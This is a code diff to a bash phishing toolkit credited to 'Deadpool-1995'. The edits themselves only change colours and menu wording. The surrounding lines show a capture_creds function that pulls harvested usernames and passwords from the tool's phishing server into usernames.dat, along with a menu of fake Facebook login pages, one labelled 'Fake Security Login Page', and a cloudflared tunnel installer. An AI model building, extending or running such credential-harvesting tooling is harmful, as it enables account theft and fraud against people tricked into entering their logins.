@@ -114,7 +114,7 @@ ${ORANGE}
 ${ORANGE}                    ${RED}Version : 1.2
               
 
-${SKYBLUE}[${WHITE}-${GREEN}]${CYAN} Tool Created by Deadpool-1995 ${WHITE}
+${RED}[${WHITE}-${GREEN}]${CYAN} Tool Created by Deadpool-1995 ${WHITE}
 EOF
 }
         
@@ -214,7 +214,7 @@ install_cloudflared() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Happy Hacking.${RESETBG}\n"
+	echo -e "${REDBG}${BLACK} Happy Hacking.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -222,7 +222,7 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}Deadpool
+		${SKYBLUE}Author   ${RED}:  ${ORANGE}Deadpool
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Deadpool1995
 		${GREEN}Social   ${RED}:  ${CYAN}https://bit.ly/Deadpool1995
 		${GREEN}Version  ${RED}:  ${ORANGE}1.0
@@ -278,11 +278,11 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${SKYBLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${SKYBLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PURPLE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
 }
 
 ## Print data
@@ -351,7 +351,7 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
